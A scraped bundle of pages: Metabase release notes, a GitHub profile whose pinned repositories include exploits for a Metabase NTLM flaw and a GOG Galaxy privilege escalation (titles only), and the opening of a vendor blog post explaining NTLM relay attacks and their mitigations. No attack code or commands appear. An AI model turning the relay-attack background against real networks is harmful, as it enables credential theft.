* Dashboards with tables are nearly invisible in full screen dark mode ([#51524](https://github.com/metabase/metabase/issues/51524))

**Reporting**

* Exporting to Formatted CSV or JSON Rounds Numeric Fields When Using "Multiply by a Value" ([#49439](https://github.com/metabase/metabase/issues/49439))
* PDF exports of dashboards are cut off ([#51491](https://github.com/metabase/metabase/pull/51491))

**Visualization**

* Bar chart has overlapping bars ([#51521](https://github.com/metabase/metabase/issues/51521))
* Wrong line is selected when you click on view details ([#51301](https://github.com/metabase/metabase/issues/51301))

**Other**

* Command palette should not show you admin actions if you do not have access to them ([#49729](https://github.com/metabase/metabase/issues/49729))
* Deadlock on the app db (52) ([#51316](https://github.com/metabase/metabase/issues/51316))
* Pruning query execution log can time out ([#51432](https://github.com/metabase/metabase/issues/51432))
* New Metrics API misses human-friendly text metric definition ([#51303](https://github.com/metabase/metabase/issues/51303))

 Assets
2

 Loading

 ðŸ‘
1
 jeaninerenee reacted with thumbs up emoji
 ðŸŽ‰
2
 qcind and stanete reacted with hooray emoji
 ðŸ‘€
1
 bddjr reacted with eyes emoji

All reactions

* ðŸ‘
  1 reaction
* ðŸŽ‰
  2 reactions
* ðŸ‘€
  1 reaction

 4 people reacted

## Metabase 51.9

17 Dec 16:13

![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)
[github-actions](/apps/github-actions)

[v0.51.9](/metabase/metabase/tree/v0.51.9)

[`b66f87a`](/metabase/metabase/commit/b66f87ad7f937cd87f2cf45a4b3e66dddd3a7f6a)

This commit was created on GitHub.com and signed with GitHubâ€™s **verified signature**.

GPG key ID: B5690EEEBB952194

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/metabase/metabase/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v0.51.9)

 Loading

[View all tags](/metabase/metabase/tags)

[Metabase 51.9](/metabase/metabase/releases/tag/v0.51.9)

## Upgrading

> Before you upgrade, back up your Metabase application database!

Check out our [upgrading instructions](https://metabase.com/docs/latest/operations-guide/upgrading-metabase).

[Get the most out of Metabase](https://www.metabase.com/pricing?utm_source=github&utm_medium=release-notes&utm_campaign=plan-comparison). Learn more about advanced features, managed cloud, and first-class support.

## Metabase Open Source

Docker image: [`metabase/metabase:v0.51.9`](https://hub.docker.com/r/metabase/metabase/tags)

JAR download: <https://downloads.metabase.com/v0.51.9/metabase.jar>

## Metabase Enterprise

Docker image: [`metabase/metabase-enterprise:v1.51.9`](https://hub.docker.com/r/metabase/metabase-enterprise/tags)

JAR download: <https://downloads.metabase.com/enterprise/v1.51.9/metabase.jar>

## Changelog

### Enhancements

**Embedding**

* fix(sdk): simplify font config by not providing sans-serif fallback ([#51343](https://github.com/metabase/metabase/pull/51343))
* ci(sdk): add package.json to sdk exports block ([#51328](https://github.com/metabase/metabase/pull/51328))
* Temporarily disable failing workflows for 51 branch ([#51318](https://github.com/metabase/metabase/pull/51318))
* Fix Embedding SDK cross-version e2e tests for release 51 branch ([#51171](https://github.com/metabase/metabase/pull/51171))
* docs(sdk): simpler documentation for building the sdk locally ([#51064](https://github.com/metabase/metabase/pull/51064))
* Update SDK version to 0.51.12 ([#51362](https://github.com/metabase/metabase/pull/51362))

**Other**

* guard against a stage number in matching ([#51264](https://github.com/metabase/metabase/pull/51264))
* skip tracking non react-sdk x-metabase-clients ([#51252](https://github.com/metabase/metabase/pull/51252))

### Bug fixes

**Querying**

* Cannot Save Native Queries with Crosstabs that have long Definitions ([#51131](https://github.com/metabase/metabase/issues/51131))

**Reporting**

* PieChart: Pulse card render error â€“ No row values found for key {some name} ([#50381](https://github.com/metabase/metabase/issues/50381))

**Visualization**

* [Bubble] Tooltip Not Working ([#50630](https://github.com/metabase/metabase/issues/50630))
* "fix scatter chart tooltip [#50889](https://github.com/metabase/metabase/pull/50889)" ([#51145](https://github.com/metabase/metabase/pull/51145))
* Pie chart error: no row values found for key ([#50090](https://github.com/metabase/metabase/issues/50090))

 Assets
2

 Loading

 ðŸš€
1
 qcind reacted with rocket emoji

All reactions

* ðŸš€
  1 reaction

 1 person reacted

## Metabase 52.3

17 Dec 05:01

![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)
[github-actions](/apps/github-actions)

[v0.52.3](/metabase/metabase/tree/v0.52.3)

[`6f76bb6`](/metabase/metabase/commit/6f76bb62886b4cc74466fc6041611caa29779fe9)

This commit was created on GitHub.com and signed with GitHubâ€™s **verified signature**.

GPG key ID: B5690EEEBB952194

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/metabase/metabase/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v0.52.3)

 Loading

[View all tags](/metabase/metabase/tags)

[Metabase 52.3](/metabase/metabase/releases/tag/v0.52.3)

## Upgrading

> Before you upgrade, back up your Metabase application database!

Check out our [upgrading instructions](https://metabase.com/docs/latest/operations-guide/upgrading-metabase).

[Get the most out of Metabase](https://www.metabase.com/pricing?utm_source=github-release-notes). Learn more about advanced features, managed cloud, and first-class support.

## Metabase Open Source

Docker image: [`metabase/metabase:v0.52.3`](https://hub.docker.com/r/metabase/metabase/tags)

JAR download: <https://downloads.metabase.com/v0.52.3/metabase.jar>

## Metabase Enterprise

Docker image: [`metabase/metabase-enterprise:v1.52.3`](https://hub.docker.com/r/metabase/metabase-enterprise/tags)

JAR download: <https://downloads.metabase.com/enterprise/v1.52.3/metabase.jar>

## Notes

## Changelog

### Enhancements

**Embedding**

* Fix embed loader not translated with #locale ([#50841](https://github.com/metabase/metabase/pull/50841))
* Support providing parameter values in InteractiveQuestion in the sdk ([#50493](https://github.com/metabase/metabase/issues/50493))
* [SDK] create a "compatibility layer" for nextjs ([#50439](https://github.com/metabase/metabase/issues/50439))
* [SDK] when components are rendered outside of the provider, they should not make the host app crash ([#50736](https://github.com/metabase/metabase/issues/50736))

**Querying**

* Fix distribution drill thru for multi-stage queries ([#51247](https://github.com/metabase/metabase/pull/51247))

**Other**

* Use pr-str so log data is parseable ([#51275](https://github.com/metabase/metabase/pull/51275))
* More logging around search index maintenance ([#51206](https://github.com/metabase/metabase/pull/51206))
* Better diagnostic info when Search Index is not ready ([#51201](https://github.com/metabase/metabase/pull/51201))
* guard against a stage number in matching ([#51263](https://github.com/metabase/metabase/pull/51263))
* update tracking for embedding-sdk-react and embedding-iframe x-metabase-clients ([#51179](https://github.com/metabase/metabase/pull/51179))
* Quiet snowflake logging ([#51138](https://github.com/metabase/metabase/pull/51138))
* Fix alert condition text ([#51117](https://github.com/metabase/metabase/pull/51117))
* Fix the "invite" screenshot ([#51098](https://github.com/metabase/metabase/pull/51098))
* [search] track average entry index time as histogram ([#51095](https://github.com/metabase/metabase/pull/51095))
* Onboarding accordion items can sometimes expand outside the viewport ([#51006](https://github.com/metabase/metabase/issues/51006))
* Cancelled requests are overly verbose ([#50992](https://github.com/metabase/metabase/issues/50992))
* Use the time\_history icon to display when a question was last updated ([#50952](https://github.com/metabase/metabase/pull/50952))
* Encapsulate default models to search ([#50938](https://github.com/metabase/metabase/pull/50938))
* Enable bug reporting ([#50856](https://github.com/metabase/metabase/pull/50856))
* Dismissible "How to use Metabase" sidebar link ([#50536](https://github.com/metabase/metabase/pull/50536))
* Faster sync with describe-indexes ([#49981](https://github.com/metabase/metabase/issues/49981))

### Bug fixes

**Database**

* Sync views and materialized views ([#50223](https://github.com/metabase/metabase/issues/50223))

**Querying**

* Cannot Save Native Queryies with Crosstabs that have long Definitions ([#51131](https://github.com/metabase/metabase/issues/51131))
* Updating a filter via click behavior will not populate the field on actions ([#51020](https://github.com/metabase/metabase/issues/51020))
* Order of selected filter values may cause cache miss due to hash mismatch ([#48887](https://github.com/metabase/metabase/issues/48887))
* Error when using Group by "hour of day" on an attribute from a join and a custom column ([#48058](https://github.com/metabase/metabase/issues/48058))

**Reporting**

* PDF export cuts dashboards in the middle ([#50584](https://github.com/metabase/metabase/issues/50584))

**Visualization**

* missing tooltip for waterfall chart total ([#48118](https://github.com/metabase/metabase/issues/48118))

**Other**

* Entity Picker generates wrong initial path when initial value is in another users personal collection ([#50604](https://github.com/metabase/metabase/issues/50604))
* Fail to start instance with `config.yml` if password contains special characters `{{` or `[[` ([#31562](https://github.com/metabase/metabase/issues/31562))
* Insert setting error on master ([#50978](https://github.com/metabase/metabase/issues/50978))
* Passing `?limit=` twice to a question URL returns a bare 500 ([#45345](https://github.com/metabase/metabase/issues/45345))

 Assets
2

 Loading

 ðŸ‘
2
 jeaninerenee and coredipper reacted with thumbs up emoji
 ðŸŽ‰
2
 jutaka and coredipper reacted with hooray emoji
 ðŸš€
1
 qcind reacted with rocket emoji

All reactions

* ðŸ‘
  2 reactions
* ðŸŽ‰
  2 reactions
* ðŸš€
  1 reaction

 4 people reacted

## Metabase v0.51.8

12 Dec 15:28

![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)
[github-actions](/apps/github-actions)

[v0.51.8](/metabase/metabase/tree/v0.51.8)

[`1cac120`](/metabase/metabase/commit/1cac120b8bc4069f2e0e9d51310611f1d3b1428c)

This commit was created on GitHub.com and signed with GitHubâ€™s **verified signature**.

GPG key ID: B5690EEEBB952194

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/metabase/metabase/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v0.51.8)

 Loading

[View all tags](/metabase/metabase/tags)

[Metabase v0.51.8](/metabase/metabase/releases/tag/v0.51.8)

## Upgrading

> Before you upgrade, back up your Metabase application database!

Check out our [upgrading instructions](https://metabase.com/docs/latest/operations-guide/upgrading-metabase).

Docker image: [`metabase/metabase:v0.51.8`](https://hub.docker.com/r/metabase/metabase/tags)

Download the JAR here: <https://downloads.metabase.com/v0.51.8/metabase.jar>

## Notes

SHA-256 checksum for the v0.51.8 JAR:

```
3b9ed82793ea05eccbac2698220bc9b1f17c2590cd7449dfb9929b997107477d

```

## Changelog

### Enhancements

**Embedding**

* backported "feat(sdk): next sdk compatibility layer" to v51 ([#51097](https://github.com/metabase/metabase/pull/51097))
* feat(sdk): detect if session.id is not a string ([#50890](https://github.com/metabase/metabase/pull/50890))
* fix(sdk): remove Error.captureStackTrace as it errors on firefox ([#50773](https://github.com/metabase/metabase/pull/50773))
* Combine the customTitle and withTitle prop into a single title prop for interactive questions in sdk ([#50489](https://github.com/metabase/metabase/issues/50489))
* Expose public-facing question type and transforms for sdk ([#50487](https://github.com/metabase/metabase/issues/50487))

**Querying**

* [Backport 51] Add binning to display name ([#51011](https://github.com/metabase/metabase/pull/51011))
* Fix the zoom-in.timeseries drill for multi-stage queries ([#50970](https://github.com/metabase/metabase/pull/50970))

**Other**

* Count and Categorize Public Views in query executions table ([#51079](https://github.com/metabase/metabase/pull/51079))
* Fix rollback to version 50 with null query\_field values ([#50982](https://github.com/metabase/metabase/pull/50982))
* Banner for instance in trial ([#48522](https://github.com/metabase/metabase/issues/48522))

### Bug fixes

**Administration**

* Wrong database\_type value ([#50771](https://github.com/metabase/metabase/issues/50771))

**Embedding**

* [SDK] if the sdk is imported after the css of the host app, the body and h1 tags takes the styles from core app ([#50279](https://github.com/metabase/metabase/issues/50279))

**Querying**

* Include temporal bucket/binning name in query\_metadata for a card ([#47579](https://github.com/metabase/metabase/issues/47579))

 Assets
2

 Loading

 ðŸŽ‰
2
 qcind and Godswilliyemere reacted with hooray emoji

All reactions

* ðŸŽ‰
  2 reactions

 2 people reacted

## MetabaseÂ® Enterprise Editionâ„¢ v1.51.8

12 Dec 15:28

![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)
[github-actions](/apps/github-actions)

[v1.51.8](/metabase/metabase/tree/v1.51.8)

[`1cac120`](/metabase/metabase/commit/1cac120b8bc4069f2e0e9d51310611f1d3b1428c)

This commit was created on GitHub.com and signed with GitHubâ€™s **verified signature**.

GPG key ID: B5690EEEBB952194

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/metabase/metabase/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v1.51.8)

 Loading

[View all tags](/metabase/metabase/tags)

[MetabaseÂ® Enterprise Editionâ„¢ v1.51.8](/metabase/metabase/releases/tag/v1.51.8)

## Upgrading

> Before you upgrade, back up your Metabase application database!

Check out our [upgrading instructions](https://metabase.com/docs/latest/operations-guide/upgrading-metabase).

Docker image: [`metabase/metabase-enterprise:v1.51.8`](https://hub.docker.com/r/metabase/metabase-enterprise/tags)

Download the JAR here: <https://downloads.metabase.com/enterprise/v1.51.8/metabase.jar>

## Notes

SHA-256 checksum for the v1.51.8 JAR:

```
50bf5e96591e52bab2132cbd0e663c11328c33472776d5bfa3ad648307e76a32

```

## Changelog

### Enhancements

**Embedding**

* backported "feat(sdk): next sdk compatibility layer" to v51 ([#51097](https://github.com/metabase/metabase/pull/51097))
* feat(sdk): detect if session.id is not a string ([#50890](https://github.com/metabase/metabase/pull/50890))
* fix(sdk): remove Error.captureStackTrace as it errors on firefox ([#50773](https://github.com/metabase/metabase/pull/50773))
* Combine the customTitle and withTitle prop into a single title prop for interactive questions in sdk ([#50489](https://github.com/metabase/metabase/issues/50489))
* Expose public-facing question type and transforms for sdk ([#50487](https://github.com/metabase/metabase/issues/50487))

**Querying**

* [Backport 51] Add binning to display name ([#51011](https://github.com/metabase/metabase/pull/51011))
* Fix the zoom-in.timeseries drill for multi-stage queries ([#50970](https://github.com/metabase/metabase/pull/50970))

**Other**

* Count and Categorize Public Views in query executions table ([#51079](https://github.com/metabase/metabase/pull/51079))
* Fix rollback to version 50 with null query\_field values ([#50982](https://github.com/metabase/metabase/pull/50982))
* Banner for instance in trial ([#48522](https://github.com/metabase/metabase/issues/48522))

### Bug fixes

**Administration**

* Wrong database\_type value ([#50771](https://github.com/metabase/metabase/issues/50771))

**Embedding**

* [SDK] if the sdk is imported after the css of the host app, the body and h1 tags takes the styles from core app ([#50279](https://github.com/metabase/metabase/issues/50279))

**Querying**

* Include temporal bucket/binning name in query\_metadata for a card ([#47579](https://github.com/metabase/metabase/issues/47579))

 Assets
2

 Loading

All reactions

Previous *1* [2](/metabase/metabase/releases?page=2) [3](/metabase/metabase/releases?page=3) [4](/metabase/metabase/releases?page=4) [5](/metabase/metabase/releases?page=5) â€¦ [60](/metabase/metabase/releases?page=60) [61](/metabase/metabase/releases?page=61) [Next](/metabase/metabase/releases?page=2)

Previous [Next](/metabase/metabase/releases?page=2)

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.



=== Content from github.com_ebc6c884_20250115_210750.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsecure-77)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsecure-77)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

![@secure-77](https://avatars.githubusercontent.com/u/31564517?s=64&v=4)

**secure-77**
[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Fsecure-77)

[Overview](/secure-77)
[Repositories
32](/secure-77?tab=repositories)
[Projects
0](/secure-77?tab=projects)
[Packages
0](/secure-77?tab=packages)
[Stars
190](/secure-77?tab=stars)

More

* [Overview](/secure-77)
* [Repositories](/secure-77?tab=repositories)
* [Projects](/secure-77?tab=projects)
* [Packages](/secure-77?tab=packages)
* [Stars](/secure-77?tab=stars)

![@secure-77](https://avatars.githubusercontent.com/u/31564517?s=64&v=4)

**secure-77**

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Fsecure-77)

[![View secure-77's full-sized avatar](https://avatars.githubusercontent.com/u/31564517?v=4)](https://avatars.githubusercontent.com/u/31564517?v=4)
ðŸ‰

# sec77 secure-77

ðŸ‰

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Fsecure-77)

 [Sponsor](/sponsors/secure-77)

[66
followers](https://github.com/secure-77?tab=followers) Â· [37
following](https://github.com/secure-77?tab=following)

* Germany
* [secure77.de](http://secure77.de)
* X
  [@secure\_sec77](https://twitter.com/secure_sec77)

## [Achievements](/secure-77?tab=achievements)

[![Achievement: Starstruck](https://github.githubassets.com/assets/starstruck-default-b6610abad518.png)x3](/secure-77?achievement=starstruck&tab=achievements)[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)](/secure-77?achievement=pull-shark&tab=achievements)
## [Achievements](/secure-77?tab=achievements)

[![Achievement: Starstruck](https://github.githubassets.com/assets/starstruck-default-b6610abad518.png)x3](/secure-77?achievement=starstruck&tab=achievements)[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)](/secure-77?achievement=pull-shark&tab=achievements)

Block or Report

# Block or report secure-77

**Block user**

Prevent this user from interacting with your repositories and sending you notifications.
Learn more about [blocking users](https://docs.github.com/articles/blocking-a-user-from-your-personal-account).

You must be logged in to block users.

Add an optional note:

Please don't include any personal information such as legal names or email addresses. Maximum 100 characters, markdown supported. This note will be visible to only you.

Block user

**Report abuse**

Contact GitHub support about this userâ€™s behavior.
Learn more about [reporting abuse](https://docs.github.com/articles/reporting-abuse-or-spam).

[Report abuse](/contact/report-abuse?report=secure-77+%28user%29)

[Overview](/secure-77)
[Repositories
32](/secure-77?tab=repositories)
[Projects
0](/secure-77?tab=projects)
[Packages
0](/secure-77?tab=packages)
[Stars
190](/secure-77?tab=stars)

More

* [Overview](/secure-77)
* [Repositories](/secure-77?tab=repositories)
* [Projects](/secure-77?tab=projects)
* [Packages](/secure-77?tab=packages)
* [Stars](/secure-77?tab=stars)

[secure-77](/secure-77/secure-77)/README.md

[![](https://camo.githubusercontent.com/40c3bd449d1b4159ef2d7a238f3cb7a6e449ffbed31c8dce4ed286a5dd1d8543/68747470733a2f2f6769746875622d726561646d652d73746174732e76657263656c2e6170702f6170693f757365726e616d653d7365637572652d373726696e636c7564655f616c6c5f636f6d6d6974733d7472756526686964653d636f6e74726962732673686f775f69636f6e733d74727565266c696e655f6865696768743d333226636f756e745f707269766174653d74727565267468656d653d63616c6d)](https://github.com/secure-77/secure-77)
[![](https://camo.githubusercontent.com/d56787802b7690591a16b69b66797c2ca8380b286d0ff0c1ef807ba799355822/68747470733a2f2f6769746875622d726561646d652d73746174732e76657263656c2e6170702f6170692f746f702d6c616e67732f3f757365726e616d653d7365637572652d3737266c696e655f6865696768743d333226686964653d4d616b6566696c652c637373267468656d653d63616c6d266c616e67735f636f756e743d33)](https://github.com/secure-77/secure-77)

---

[![secure-77](https://camo.githubusercontent.com/03355c6e5f5c97a0ba2b8f55ef2899623ed1457d96f4acf01e31ce91169a38b6/68747470733a2f2f6b6f6d617265762e636f6d2f67687076632f3f757365726e616d653d7365637572652d3737266c6162656c3d50726f66696c65253230766965777326636f6c6f723d306537356236267374796c653d666c6174)](https://camo.githubusercontent.com/03355c6e5f5c97a0ba2b8f55ef2899623ed1457d96f4acf01e31ce91169a38b6/68747470733a2f2f6b6f6d617265762e636f6d2f67687076632f3f757365726e616d653d7365637572652d3737266c6162656c3d50726f66696c65253230766965777326636f6c6f723d306537356236267374796c653d666c6174)

## Pinned Loading

1. [Perlite](/secure-77/Perlite) Perlite Public

   A web-based markdown viewer optimized for Obsidian

   CSS

   [1.2k](/secure-77/Perlite/stargazers)
   [104](/secure-77/Perlite/forks)
2. [PSAccessFinder](/secure-77/PSAccessFinder) PSAccessFinder Public

   searches recursive for folders where the current user has permissions

   PowerShell

   [6](/secure-77/PSAccessFinder/stargazers)
3. [CVE-2022-24853](/secure-77/CVE-2022-24853) CVE-2022-24853 Public

   Metabase NTLM Attack

   [2](/secure-77/CVE-2022-24853/stargazers)
4. [CVE-2022-31262](/secure-77/CVE-2022-31262) CVE-2022-31262 Public

   GOG Galaxy LPE Exploit

   PowerShell

   [4](/secure-77/CVE-2022-31262/stargazers)
5. [powershell-http-server](/secure-77/powershell-http-server) powershell-http-server Public

   simple python like http server

   PowerShell

   [6](/secure-77/powershell-http-server/stargazers)
   [1](/secure-77/powershell-http-server/forks)
6. [shellCodeGenerator](/secure-77/shellCodeGenerator) shellCodeGenerator Public

   x64 WinExec Shellcode Generator

   C

   [6](/secure-77/shellCodeGenerator/stargazers)

Something went wrong, please refresh the page to try again.

If the problem persists, check the [GitHub status page](https://www.githubstatus.com/)
or [contact support](/contact).

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.



=== Content from www.qomplx.com_a34053dc_20250114_234859.html ===


[![Cyber Risk Analytics Management - QOMPLX](https://www.qomplx.com/content/images/2022/07/qomplx-logo-footer.svg)](https://www.qomplx.com)

* Products
  [Identity Threat Detection and Response (ITDR)

  Prevent, detect and respond to identity threats in real-time

  Learn more](/itdr/)

  [Privilege Assurance](/itdr/privilege/)

  [Identity Assurance](/itdr/identity/)

  [Managed Detection and Response

  Cost-effective cybersecurity for small to medium-sized firms

  Learn more](/mdr/)

  [Attack Surface Monitoring

  Discover cyber vulnerabilities and size of your attack surface

  Learn more](/attack-surface-monitoring/)

  [Q:SCAN](/attack-surface-monitoring/scan/)

  [Third Party](/attack-surface-monitoring/third-party/)

  [![](https://www.qomplx.com/content/images/2022/12/whitepaper.svg)

  White Paper

  ### ManyKatz: How Active Directory Hacks Went Mainstream

  Read more](/resources/whitepapers/manykatz-how-active-directory-hacks-went-mainstream/)
* Services
  [Offensive Security Services

  Gain a hackerâ€™s perspective on your network](https://www.qomplx.com/offensive-security-services/)

  [Active Directory Security Assessment

  Identify and mitigate AD security risks to your network](https://www.qomplx.com/active-directory-security-assessment/)

  [vCISO

  On-demand cybersecurity experts](https://www.qomplx.com/vciso/)
* Resources
  [Blog

  Check out important cybersecurity topics and the QOMPLX perspective

  Learn more](https://www.qomplx.com/blog/)

  [Content hub

  Research thought leadership, product benefits, use cases, and more

  Learn more](https://www.qomplx.com/resources/)

  [Case studies](https://www.qomplx.com/resources/case-studies/)

  [Data sheets](https://www.qomplx.com/resources/datasheets/)

  [Overviews](https://www.qomplx.com/resources/overview/)

  [Tech specs](https://www.qomplx.com/resources/technical-specification/)

  [Videos](https://www.qomplx.com/resources/videos/)

  [Webinars](https://www.qomplx.com/resources/webinar/)

  [Whitepapers](https://www.qomplx.com/resources/whitepapers/)

  [![](https://www.qomplx.com/content/images/2022/12/data-sheet.svg)

  Data Sheet

  ### QOMPLX Privilege Assurance AD data sheet

  Read more](/resources/datasheets/privilege-assurance-data-sheet/)
* [Partners](https://www.qomplx.com/partners/)
* Company
  [About QOMPLX

  Gain unified visibility into cyber risks & trust in identity](https://www.qomplx.com/about-qomplx/)

  [Events

  Want to meet QOMPLX? View our list of upcoming events and trade shows](https://www.qomplx.com/events/)

  [Newsroom

  Research current news about QOMPLX](https://www.qomplx.com/news/)

  [Contact Us

  Discuss your firmâ€™s cyber challenges with an expert](https://www.qomplx.com/contact-us/)

  [![](https://www.qomplx.com/content/images/2022/12/whitepaper.svg)

  White Paper

  ### Aite Impact Brief: Fixing Vulnerabilities in Active Directory and Kerberos

  Read more](/resources/whitepapers/aite-impact-brief/)

+ [Login](https://qomplxos.com/)
+ [Request a meeting](https://www.qomplx.com/request-a-meeting/)
+ [Request a demo](https://www.qomplx.com/request-a-demo/)

* QOMPLX Knowledge
* Aug 11, 2020
* By  QOMPLX

# QOMPLX Knowledge: NTLM Relay Attacks Explained

![QOMPLX Knowledge: NTLM Relay Attacks Explained](/content/images/2020/08/AdobeStock_320943598.jpg)

![](https://www.qomplx.com/assets/images/blog/post-background.jpeg?v=7fa993d3e7)

*This is the latest in our â€œQOMPLX Knowledgeâ€ series. These posts are intended to provide basic information and insights about the attack activity and trends that are driving malicious campaigns and that QOMPLX researchers encounter in our forensic work with customers.*

---

Each security incident and data breach is uniqueâ€”a singular combination of vulnerable and misconfigured systems, compromised assets, attacker motivations and chance. But when you talk with security experts about the â€œwhysâ€ of security incidents these days, a familiar acronym pops up: NTLM. That stands for NT LAN Manager, a security protocol that is in its third decade of existence and that has worked its way deep into enterprise networks. The persistence of NTLM and the difficulty organizations have had jettisoning it has contributed to a long-running trend of data breaches as attackers leverage targeted- as well as trivial and automated attacks to put critical systems at risk.

Despite its many security weaknesses, NTLM is still supported by many legacy systems and applications. More than 20 years after the introduction of NTLM's "replacement" (Kerberos), backwards compatibility with the legacy Windows systems and applications has kept NTLM in the fold, adding complexity and weakness to Active Directory implementations in particular.

One of the biggest sources of compromises are so-called NTLM â€œreplayâ€ attacks in which an attacker positions themselves between clients and servers that are doing NTLM authentication, capturing credentials and facilitating lateral movement by replaying legitimate credentials on other servers.

## Key Points

* NTLM relay attacks allow attackers to sit between clients and servers and relay validated authentication requests in order to access network services
* Unlike NTLM, a challenge-response protocol, Kerberosâ€™ mutual authentication is considered more secure and has been the de facto standard in Windows since Windows 2000
* Microsoft recommends a number of mitigations for NTLM relay attacks, including SMB and LDAP signing, and EPA,
* The best fix for NTLM insecurity is to stop using NTLM within an organization and for NTLM to be deprecated

## What is NTLM?

NTLM is a Microsoft proprietary authentication protocol and it was standard in early Windows server systems through Windows 2000, when Kerberos became its de facto successor and is still the standard for authentication in Windows systems.

First introduced in the 1990s, NTLM replaced Microsoftâ€™s older LAN Manager (LANMAN). NTLM is a challenge-response authentication protocol which uses a series of three messages to authenticate a client. The NTLM protocol uses the RC4 algorithm for encryption. It uses one or both of two un-salted hashed password values which are stored on the client and the server (or domain controller). NTLM uses two hashing algorithms: the LM Hash (a DES-based function applied to the first 14 chars of the password converted to the traditional 8 bit PC charset for the language) and the NT Hash (an MD4 of the little endian UTF-16 Unicode password). Both hash values are 16 bytes (128 bits) each.

